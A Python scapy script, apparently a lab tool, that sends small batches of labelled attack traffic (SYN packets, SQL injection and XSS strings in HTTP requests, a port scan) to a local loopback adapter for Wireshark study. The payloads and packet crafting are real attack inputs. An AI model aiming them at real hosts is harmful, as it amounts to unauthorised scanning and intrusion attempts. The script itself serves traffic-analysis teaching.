#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
发送攻击流量到虚拟网卡 - 可被Wireshark捕获
"""

import sys
import time
import random
from scapy.all import IP, TCP, Ether, Raw, sendp, conf
import logging

logging.basicConfig(level=logging.INFO, format='%(message)s')


class AttackSender:
    """攻击流量发送器"""

    def __init__(self, interface_ip="192.168.100.1"):
        self.target_ip = interface_ip

    def get_interface(self):
        """获取虚拟网卡接口"""
        try:
            # 尝试找到虚拟网卡
            interfaces = conf.ifaces
            print("\n可用的网络接口:")
            for i, iface in enumerate(interfaces, 1):
                print(f"  {i}. {iface}")
            return None
        except:
            return None

    def send_syn_flood(self):
        """发送SYN Flood攻击"""
        print("\n🔴 发送 SYN Flood 攻击流量...")

        src_ip = "192.168.100.10"
        packets_sent = 0

        for i in range(20):
            packet = IP(src=src_ip, dst=self.target_ip) / TCP(
                sport=1024 + i,
                dport=80,
                flags='S'
            )

            try:
                # 发送到网络
                sendp(packet, verbose=False, iface=None)
                packets_sent += 1
                print(f"    发送 SYN 包 #{i+1}/20")
                time.sleep(0.1)
            except Exception as e:
                print(f"    警告: 发送失败 - {e}")

        print(f"    ✓ 已发送 {packets_sent} 个 SYN Flood 包")
        return packets_sent

    def send_sql_injection(self):
        """发送SQL注入攻击"""
        print("\n🔴 发送 SQL 注入攻击流量...")

        src_ip = "192.168.100.20"
        sql_payloads = ["' OR '1'='1", "admin'--", "' UNION SELECT * FROM users--"]
        packets_sent = 0

        for i, payload in enumerate(sql_payloads):
            http_request = f"GET /login?id={payload} HTTP/1.1\r\nHost: {self.target_ip}\r\n\r\n"

            packet = IP(src=src_ip, dst=self.target_ip) / TCP(
                sport=45000 + i,
                dport=80,
                flags='PA'
            ) / Raw(load=http_request.encode())

            try:
                sendp(packet, verbose=False, iface=None)
                packets_sent += 1
                print(f"    发送 SQL 注入 #{i+1}/{len(sql_payloads)}: {payload[:20]}...")
                time.sleep(0.2)
            except Exception as e:
                print(f"    警告: 发送失败 - {e}")

        print(f"    ✓ 已发送 {packets_sent} 个 SQL 注入攻击")
        return packets_sent

    def send_port_scan(self):
        """发送端口扫描攻击"""
        print("\n🟡 发送端口扫描攻击流量...")

        src_ip = "192.168.100.30"
        ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 3389]
        packets_sent = 0

        for port in ports:
            packet = IP(src=src_ip, dst=self.target_ip) / TCP(
                sport=50000 + port,
                dport=port,
                flags='S'
            )

            try:
                sendp(packet, verbose=False, iface=None)
                packets_sent += 1
                print(f"    扫描端口: {port}")
                time.sleep(0.15)
            except Exception as e:
                print(f"    警告: 扫描端口 {port} 失败 - {e}")

        print(f"    ✓ 已扫描 {packets_sent} 个端口")
        return packets_sent

    def send_xss_attack(self):
        """发送XSS攻击"""
        print("\n🟡 发送 XSS 攻击流量...")

        src_ip = "192.168.100.40"
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert('XSS')"
        ]
        packets_sent = 0

        for i, payload in enumerate(xss_payloads):
            http_request = f"GET /search?q={payload} HTTP/1.1\r\nHost: {self.target_ip}\r\n\r\n"

            packet = IP(src=src_ip, dst=self.target_ip) / TCP(
                sport=46000 + i,
                dport=80,
                flags='PA'
            ) / Raw(load=http_request.encode())

            try:
                sendp(packet, verbose=False, iface=None)
                packets_sent += 1
                print(f"    发送 XSS 攻击 #{i+1}: {payload[:25]}...")
                time.sleep(0.2)
            except Exception as e:
                print(f"    警告: 发送失败 - {e}")

        print(f"    ✓ 已发送 {packets_sent} 个 XSS 攻击")
        return packets_sent

    def run_all(self):
        """运行所有攻击"""
        print("="*70)
        print("【Wireshark 攻击流量发送器】")
        print("="*70)
        print(f"目标IP: {self.target_ip}")
        print()
        print("【重要提示】")
        print("1. 请先安装 Microsoft Loopback Adapter")
        print("2. 设置IP地址为: " + self.target_ip)
        print("3. 在Wireshark中选择该网卡")
        print("4. 开始捕获后，按任意键继续...")
        print("="*70)

        input("\n按Enter键开始发送攻击流量...")

        total_packets = 0
        total_packets += self.send_syn_flood()
        total_packets += self.send_sql_injection()
        total_packets += self.send_port_scan()
        total_packets += self.send_xss_attack()

        print("\n" + "="*70)
        print("【发送完成】")
        print("="*70)
        print(f"总共发送: {total_packets} 个攻击数据包")
        print()
        print("【下一步】")
        print("1. 在Wireshark中停止捕获")
        print("2. 使用过滤器分析流量")
        print("3. 右键数据包 → Follow TCP Stream 查看详细内容")
        print("="*70)


def main():
    import argparse

    parser = argparse.ArgumentParser(description='发送攻击流量到虚拟网卡 - Wireshark可捕获')
    parser.add_argument('-t', '--target-ip',
                        default='192.168.100.1',
                        help='目标IP地址 (默认: 192.168.100.1)')

    args = parser.parse_args()

    sender = AttackSender(interface_ip=args.target_ip)

    try:
        sender.run_all()
    except KeyboardInterrupt:
        print("\n\n用户中断")
    except Exception as e:
        print(f"\n\n错误: {e}")


if __name__ == '__main__':
    main()
